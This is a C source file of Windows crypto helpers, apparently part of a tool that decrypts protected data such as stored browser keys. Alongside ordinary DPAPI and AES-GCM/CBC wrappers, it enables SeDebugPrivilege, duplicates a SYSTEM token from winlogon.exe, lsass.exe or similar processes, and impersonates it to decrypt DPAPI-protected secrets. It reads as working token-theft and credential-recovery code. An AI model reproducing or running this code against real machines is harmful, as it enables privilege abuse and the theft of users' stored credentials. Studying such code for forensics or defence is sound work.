#include "crypto.h"
#include <bcrypt.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0)
#endif

unsigned char *cm_dpapi_unprotect(const unsigned char *data, size_t len, size_t *out_len,
                                  DWORD *win32err)
{
    DATA_BLOB in, out;
    in.cbData = (DWORD)len;
    in.pbData = (BYTE *)data;
    out.cbData = 0; out.pbData = NULL;
    SetLastError(0);
    if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        if (win32err) *win32err = GetLastError();
        return NULL;
    }
    unsigned char *result = (unsigned char *)malloc(out.cbData ? out.cbData : 1);
    if (result && out.cbData) memcpy(result, out.pbData, out.cbData);
    if (out_len) *out_len = out.cbData;
    if (out.pbData) LocalFree(out.pbData);
    return result;
}

static void enable_se_debug(void)
{
    LUID luid;
    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) return;
    HANDLE tok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) return;
    TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(tok, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(tok);
}

static HANDLE duplicate_system_token(int pid)
{
    HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!proc) proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!proc) return NULL;
    HANDLE raw = NULL, imp = NULL;
    if (OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &raw)) {
        DuplicateTokenEx(raw, TOKEN_IMPERSONATE | TOKEN_QUERY, NULL,
                         SecurityImpersonation, TokenImpersonation, &imp);
        CloseHandle(raw);
    }
    CloseHandle(proc);
    return imp;
}

int   cm_sys_dpapi_token_obtained = 0;
DWORD cm_sys_dpapi_err = 0;

unsigned char *cm_dpapi_unprotect_as_system(const unsigned char *data, size_t len, size_t *out_len)
{
    cm_sys_dpapi_token_obtained = 0; cm_sys_dpapi_err = 0;
    enable_se_debug();
    static const wchar_t *preferred[] = { L"winlogon.exe", L"services.exe", L"lsass.exe", L"wininit.exe" };
    HANDLE token = NULL;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        for (int pref = 0; pref < 4 && !token; pref++) {
            PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
            if (Process32FirstW(snap, &pe)) {
                do {
                    if (_wcsicmp(pe.szExeFile, preferred[pref]) == 0) {
                        token = duplicate_system_token((int)pe.th32ProcessID);
                        if (token) break;
                    }
                } while (Process32NextW(snap, &pe));
            }
        }
        CloseHandle(snap);
    }
    if (!token) return NULL;
    cm_sys_dpapi_token_obtained = 1;
    unsigned char *result = NULL;
    if (SetThreadToken(NULL, token)) {
        result = cm_dpapi_unprotect(data, len, out_len, &cm_sys_dpapi_err);
        RevertToSelf();
    } else {
        cm_sys_dpapi_err = GetLastError();
    }
    CloseHandle(token);
    return result;
}

static BCRYPT_ALG_HANDLE open_aes(const wchar_t *chainMode)
{
    BCRYPT_ALG_HANDLE alg = NULL;
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS)
        return NULL;
    if (BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)chainMode,
                          (ULONG)((wcslen(chainMode) + 1) * sizeof(wchar_t)), 0) != STATUS_SUCCESS) {
        BCryptCloseAlgorithmProvider(alg, 0);
        return NULL;
    }
    return alg;
}

unsigned char *cm_aes_gcm_decrypt(const unsigned char *key, size_t keyLen,
                                  const unsigned char *nonce, size_t nonceLen,
                                  const unsigned char *cipher, size_t cipherLen,
                                  const unsigned char *tag, size_t tagLen,
                                  size_t *out_len)
{
    BCRYPT_ALG_HANDLE alg = open_aes(BCRYPT_CHAIN_MODE_GCM);
    if (!alg) return NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    unsigned char *plain = NULL;
    if (BCryptGenerateSymmetricKey(alg, &hKey, NULL, 0, (PUCHAR)key, (ULONG)keyLen, 0) == STATUS_SUCCESS) {
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
        BCRYPT_INIT_AUTH_MODE_INFO(info);
        info.pbNonce = (PUCHAR)nonce; info.cbNonce = (ULONG)nonceLen;
        info.pbTag   = (PUCHAR)tag;   info.cbTag   = (ULONG)tagLen;
        plain = (unsigned char *)malloc(cipherLen ? cipherLen : 1);
        ULONG done = 0;
        NTSTATUS st = BCryptDecrypt(hKey, (PUCHAR)cipher, (ULONG)cipherLen, &info, NULL, 0,
                                    plain, (ULONG)cipherLen, &done, 0);
        if (st != STATUS_SUCCESS) { free(plain); plain = NULL; }
        else if (out_len) *out_len = done;
        BCryptDestroyKey(hKey);
    }
    BCryptCloseAlgorithmProvider(alg, 0);
    return plain;
}

bool cm_aes_gcm_encrypt(const unsigned char *key, size_t keyLen,
                        const unsigned char *nonce, size_t nonceLen,
                        const unsigned char *plain, size_t plainLen,
                        unsigned char *cipherOut, unsigned char tagOut[16])
{
    BCRYPT_ALG_HANDLE alg = open_aes(BCRYPT_CHAIN_MODE_GCM);
    if (!alg) return false;
    BCRYPT_KEY_HANDLE hKey = NULL;
    bool ok = false;
    if (BCryptGenerateSymmetricKey(alg, &hKey, NULL, 0, (PUCHAR)key, (ULONG)keyLen, 0) == STATUS_SUCCESS) {
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
        BCRYPT_INIT_AUTH_MODE_INFO(info);
        info.pbNonce = (PUCHAR)nonce; info.cbNonce = (ULONG)nonceLen;
        info.pbTag   = tagOut;        info.cbTag   = 16;
        ULONG done = 0;
        NTSTATUS st = BCryptEncrypt(hKey, (PUCHAR)plain, (ULONG)plainLen, &info, NULL, 0,
                                    cipherOut, (ULONG)plainLen, &done, 0);
        ok = (st == STATUS_SUCCESS);
        BCryptDestroyKey(hKey);
    }
    BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}

unsigned char *cm_aes_cbc_decrypt(const unsigned char *key, size_t keyLen,
                                  const unsigned char *iv,
                                  const unsigned char *data, size_t dataLen,
                                  size_t *out_len)
{
    if (dataLen == 0 || (dataLen % 16) != 0) return NULL;
    BCRYPT_ALG_HANDLE alg = open_aes(BCRYPT_CHAIN_MODE_CBC);
    if (!alg) return NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    unsigned char *plain = NULL;
    if (BCryptGenerateSymmetricKey(alg, &hKey, NULL, 0, (PUCHAR)key, (ULONG)keyLen, 0) == STATUS_SUCCESS) {
        unsigned char ivCopy[16];
        memcpy(ivCopy, iv, 16);
        plain = (unsigned char *)malloc(dataLen);
        ULONG done = 0;
        NTSTATUS st = BCryptDecrypt(hKey, (PUCHAR)data, (ULONG)dataLen, NULL, ivCopy, 16,
                                    plain, (ULONG)dataLen, &done, 0);
        if (st != STATUS_SUCCESS) { free(plain); plain = NULL; }
        else if (out_len) *out_len = done;
        BCryptDestroyKey(hKey);
    }
    BCryptCloseAlgorithmProvider(alg, 0);
    return plain;
}
